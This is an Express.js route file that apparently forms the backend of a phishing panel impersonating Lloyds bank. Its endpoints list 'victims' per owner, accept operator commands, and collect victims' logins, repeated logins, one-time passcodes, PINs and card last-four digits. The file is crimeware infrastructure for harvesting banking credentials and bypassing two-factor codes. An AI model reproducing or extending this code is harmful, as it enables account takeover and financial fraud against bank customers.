const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitPin,
  submitLast4,
  deleteEntry,
} = require("../controllers/lloydsController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/pin", submitPin);
router.post("/last4", submitLast4);
router.post("/delete", deleteEntry);

module.exports = router;
